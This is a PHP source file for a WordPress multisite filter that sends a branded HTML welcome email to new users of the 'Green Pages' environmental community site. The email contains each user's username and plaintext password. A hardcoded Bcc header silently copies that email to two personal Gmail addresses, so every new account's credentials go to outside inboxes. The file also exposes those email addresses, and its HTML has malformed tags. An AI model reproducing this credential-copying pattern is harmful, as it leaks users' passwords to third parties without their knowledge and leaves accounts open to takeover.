<?php
add_filter( 'wpmu_welcome_user_notification', 'gp_wpmu_welcome_user_notification', 10, 2 );
function gp_wpmu_welcome_user_notification($user_id, $plaintext_pass = '') {
  $user = new WP_User($user_id);

  $user_login = stripslashes($user->user_login);
  $user_email = stripslashes($user->user_email);

  // The blogname option is escaped with esc_html on the way into the dtaabase 
  // in sanitize_option.  We want to reverse this for the plain text arena of 
  // emails.
  $blogname = wp_specialchars_decode(get_option('blogname'), ENT_QUOTES);

  $message  = sprintf(__('New user registration on your site %s:'), $blogname) . "\r\n\r\n";
  $message .= sprintf(__('Username: %s'), $user_login) . "\r\n\r\n";
  $message .= sprintf(__('E-mail: %s'), $user_email) . "\r\n";

  @wp_mail(get_option('admin_email'), sprintf(__('[%s] New User Registration'), $blogname), $message);

  if ( empty($plaintext_pass) )
    return;

  $bcc = "eddy.repsondek@gmail.com, katiepatrickgp@gmail.com";

  $headers  = 'Content-type: text/html' . "\r\n";
  $headers .= 'Bcc: ' . $bcc . "\r\n";

  $message = '<table width="100%" style="font-size: 11px; font-family: helvetica, arial, tahoma; margin: 5px; background-color: rgb(255,255,255);">' . "\r\n";
  $message .=	'<tr>' . "\r\n";
  $message .=	'	<td align="center">' . "\r\n";
  $message .=	'		<table width="640" bgcolor="#fff" style="background-color: #fff;">' . "\r\n";
  $message .=	'			<tr style="padding: 0 5px 5px 10px;">' . "\r\n";
  $message .=	'				<td style="padding:0 0 0 7px;">' . "\r\n";
  $message .=	'					<a href="' . site_url() . "><img src=" . site_url() . '/wp-content/uploads/2011/11/gp.png" align="left" </a>						' . "\r\n";
  $message .=	'				</td>' . "\r\n";
  $message .=	'			</tr>' . "\r\n";
  $message .=	'			<tr><td><hr></td></tr>' . "\r\n";
  $message .=	'			<tr style="padding: 0 5px 5px 5px;">					' . "\r\n";
  $message .=	'				<td style="font-size: 32px;font-weight:bold;text-transform:none;color:rgb(120,120,120);padding:10px 0 10px 7px;">Welcome to the <br /> Green Pages Community!<br /></td>' . "\r\n";
  $message .=	'			<tr style="padding: 0 5px 5px 5px;">					' . "\r\n";
  $message .=	'				<td style="font-size: 16px;font-weight:bold;text-transform:none;color:rgb(120,120,120);padding:10px 0 50px 7px;">Here is your username and password:<br /><br />' . "\r\n";
  $message .=	'				Username: ' . $user_login . '<br />' . "\r\n";
  $message .=	'				Password: ' . $plaintext_pass . "\r\n";
  $message .=	'				</td>' . "\r\n";
  $message .=	'			</tr>' . "\r\n";
  $message .=	'			<tr>' . "\r\n\r\n";
  $message .=	'				<td><span style="font-size:20px; padding:0px 0 0 0px;color:rgb(1,174,216);font-weight:bold;">Join Green Pages on Facebook and Twitter!</span></td>' . "\r\n";
  $message .=	'					<td align="right"></td>' . "\r\n";
  $message .=	'			</tr>' . "\r\n";
  $message .=	'			<tr>' . "\r\n";
  $message .=	'				<td colspan="2"><hr style="padding:0px;margin:2px 0 10px 0;"></td>' . "\r\n";
  $message .=	'			</tr>' . "\r\n";
  $message .=	'		</table>' . "\r\n";
  $message .=	'		<table cellpadding="10px" cellspacing="0" border="0" width="640" bgcolor="#fff" style="background-color: #fff; margin: 0 3px 0 3px;">' . "\r\n";
  $message .=	'			<tr>' . "\r\n";
  $message .=	'				<td><a href="http://www.facebook.com/pages/Green-Pages-Community/135951849770296?ref=ts"><img src="http://www.thegreenpages.com.au/wp-content/uploads/2011/11/fpolo4.jpg" alt="header" width="200" height="243" border="0px"/></a></td>' . "\r\n";
  $message .=	'				<td><a href="http://twitter.com/GreenPagesAu"><img src="http://www.thegreenpages.com.au/wp-content/uploads/2011/11/tpolo5.jpg" alt="header" width="200" height="243" border="0px"/></a></td>	' . "\r\n";
  $message .=	'			</tr>' . "\r\n";
  $message .=	'		</table>' . "\r\n";
  $message .=	'		<table cellpadding="0" cellspacing="0" border="0" width="640" bgcolor="#fff" style="background-color: #fff;">' . "\r\n";
  $message .=	'			<tr>' . "\r\n";
  $message .=	'				<td width="640" style="padding: 0 0 0 5px;" valign="top">' . "\r\n";
  $message .=	'					<!--Headings1 News-->' . "\r\n";
  $message .=	'						<table cellpadding="0" cellspacing="0" border="0" width="100%" style="margin: 20px 0 0px 0;">' . "\r\n";
  $message .=	'							<tr>' . "\r\n";
  $message .=	'								<td><span style="font-size:20px; padding:0px 0 0 0px;color:rgb(1,174,216);font-weight:bold;">Get Involved in the News, Projects & Events <br>Straight from the Environmental Community</td>' . "\r\n";
  $message .=	'								<td align="right">' . "\r\n";
  $message .=	'								</td>' . "\r\n";
  $message .=	'							</tr>' . "\r\n";
  $message .=	'							<tr>' . "\r\n";
  $message .=	'								<td colspan="2"><hr style="padding:0px;margin:2px 0 10px 0;"></td>' . "\r\n";
  $message .=	'							</tr>' . "\r\n";
  $message .=	'							<tr>' . "\r\n";
  $message .=	'								<td colspan="2" valign="top">' . "\r\n";
  $message .=	'									<table cellpadding="0" cellspacing="0" border="0">' . "\r\n";
  $message .=	'									</table>' . "\r\n";
  $message .=	'								</td>' . "\r\n";
  $message .=	'							</tr>' . "\r\n";
  $message .=	'						</table>' . "\r\n";
  $message .= '					<!--Repeater1 for News Content-->' . "\r\n";
  $message .=	'					<repeater>' . "\r\n";
  $message .=	'						<table cellpadding="0" cellspacing="0" border="0" width="100%" style="margin: 0 0 10px 0;">' . "\r\n";
  $message .=	'							<tr>' . "\r\n";
  $message .=	'								<td colspan="2" valign="top">' . "\r\n";
  $message .=	'									<table cellpadding="0" cellspacing="0" border="0">' . "\r\n";
  $message .=	'										<tr>' . "\r\n";
  $message .=	'											<td valign="top"><a href="' . site_url() . '/wp-admin/post-new.php?post_type=gp_events"><img src="http://www.thegreenpages.com.au/wp-content/uploads/2011/11/event.png" alt="story" width="100" height="100" style="padding:5px;border:0px solid rgb(205,205,205);margin:0 10px 0 0;"/></a></td>' . "\r\n";
  $message .=	'											<td valign="top"><a style="text-decoration:none;" href="' . site_url() . '/wp-admin/post-new.php?post_type=gp_events"><span style="color:#717171; font-size: 18px; font-weight:bold; text-decoration:none;">Post an amazing event <br />that will change the world</span><a/></td>' . "\r\n";
  $message .=	'										</tr>' . "\r\n";
  $message .=	'										</div>' . "\r\n";
  $message .=	'									</table>' . "\r\n";
  $message .=	'								</td>' . "\r\n";
  $message .=	'							</tr>' . "\r\n";
  $message .=	'							<tr>' . "\r\n";
  $message .=	'								<td colspan="2" valign="top">' . "\r\n";
  $message .=	'									<table cellpadding="0" cellspacing="0" border="0">' . "\r\n";
  $message .=	'										<tr>' . "\r\n";
  $message .=	'											<td valign="top"><a href="' . site_url() . '/wp-admin/post-new.php?post_type=gp_advertorial"><img src="http://www.thegreenpages.com.au/wp-content/uploads/2011/11/product.png" alt="story" width="100" height="100" style="padding:5px;border:0px solid rgb(205,205,205);margin:0 10px 0 0;"/></a></td>' . "\r\n";
  $message .=	'											<td valign="top"><a style="text-decoration:none;"<a href="' . site_url() . '/wp-admin/post-new.php?post_type=gp_advertorial"><span style="color:#717171; font-size: 18px; font-weight:bold; text-decoration:none;">Post a \'Product of the Week\' <br />editorial for $89</span><a/></td>' . "\r\n";
  $message .=	'										</tr>' . "\r\n";
  $message .=	'									</table>' . "\r\n";
  $message .=	'								</td>' . "\r\n";
  $message .=	'							</tr>' . "\r\n";
  $message .=	'							<tr>' . "\r\n";
  $message .=	'								<td colspan="2" valign="top">' . "\r\n";
  $message .=	'									<table cellpadding="0" cellspacing="0" border="0">' . "\r\n";
  $message .=	'										<tr>' . "\r\n";
  $message .=	'											<td valign="top"><a href="' . site_url() . '/news/"><img src="http://www.thegreenpages.com.au/wp-content/uploads/2011/11/ngo.png" alt="story" width="100" height="100" style="padding:5px;border:0px solid rgb(205,205,205);margin:0 10px 0 0;"/></a></td>' . "\r\n";
  $message .=	'											<td valign="top"><a style="text-decoration:none;"<a href="' . site_url() . '/news/"><span style="color:#717171; font-size: 18px; font-weight:bold; text-decoration:none;">Read news direct from NGOs, industry groups and universities. Help get involved by looking out for the activist bar to join, donate, volunteer or send a letter.</span></a></td>' . "\r\n";
  $message .=	'										</tr>' . "\r\n";
  $message .=	'									</table>' . "\r\n";
  $message .=	'								</td>' . "\r\n";
  $message .=	'							</tr>' . "\r\n";
  $message .=	'						</table>' . "\r\n";
  $message .=	'					</repeater>' . "\r\n";
  $message .=	'														<!--repeaters complete-->' . "\r\n";
  $message .=	'				</td>' . "\r\n";
  $message .=	'				<td width="25"></td>' . "\r\n";
  $message .=	'			</tr>' . "\r\n";
  $message .=	'			<tr><td>&nbsp;</td></tr>' . "\r\n";
  $message .=	'		</table>' . "\r\n";
  $message .=	'		<table cellpadding="0" cellspacing="0" border="0" width="640">' . "\r\n";
  $message .=	'			<tr>' . "\r\n";
  $message .=	'				<td style="font-size: 12px; color: #fff; background-color: rgb(97,194,1); height: 40px; padding:5px 0 5px 5px;text-align:center;"><a href="' . site_url() . '" alt="greenpages" height="20" align="absmiddle" border="0" style="text-decoration: none; color:#fff;" >Green Pages, The Hub of Sustainability.</a></td>' . "\r\n";
  $message .=	'			</tr>' . "\r\n";
  $message .=	'		</table>' . "\r\n";
  $message .=	'		<table cellpadding="0" cellspacing="0" border="0" width="640" style="background: rgb(250,250,250) url(http://www.thegreenpages.com.au/razor/footer_background.jpg); height: 50px; background-repeat: repeat-x;">' . "\r\n";
  $message .=	'			<tr>' . "\r\n";
  $message .=	'				<td style="background-color: rgb(100,100,100);border-top:1px solid #fff; border-bottom: 1px solid #fff; height: 30px; text-align: center; color: #fff;font-size:10px;">' . "\r\n";
  $message .=	'					<a href="' . site_url() . '/get-involved/feedback/" style="color:#fff;text-decoration:none;font-size:10px;">Feedback</a> |' . "\r\n";
  $message .=	'					<a href="' . site_url() . '/get-involved/become-a-content-partner/" style="color:#fff;text-decoration:none;font-size:10px;">Become a Content Partner</a> |' . "\r\n";
  $message .=	'					<a href="' . site_url() . '/about/badges/" style="color:#fff;text-decoration:none;font-size:10px;">Add a GP Link to Your Site</a> |' . "\r\n";
  $message .=	'					<a href="' . site_url() . '/about/advertisers/" style="color:#fff;text-decoration:none;font-size:10px;">Advertise</a> |' . "\r\n";
  $message .=	'					<a href="' . site_url() . '/about/contact-information/" style="color:#fff;text-decoration:none;font-size:10px;">Contact</a> |';
  $message .=	'					<a href="' . site_url() . '/about/our-vision/" style="color:#fff;text-decoration:none;font-size:10px;">Our Vision</a>';
  $message .=	'				</td>' . "\r\n";
  $message .=	'			</tr>' . "\r\n";
  $message .=	'			<tr>' . "\r\n";
  $message .=	'				<td style="background-color: rgb(100,100,100); height: 50px; padding: 3px 0 7px 10px;color:#fff;font-size:10px; text-align:center;">' . "\r\n";
  $message .=	'					&copy; 2011 Green Pages functions under Creative Commons Copyright.<br /> No vibes were harmed making this website. <br /><br />					</td>' . "\r\n";
  $message .=	'			</tr>' . "\r\n";
  $message .=	'		</table>' . "\r\n";
  $message .=	'	</td>' . "\r\n";
  $message .=	' </tr>' . "\r\n";
  $message .= '</table>' . "\r\n";

  wp_mail($user_email, sprintf(__('[%s] Site Registration'), $blogname), $message, $headers);
}
?>
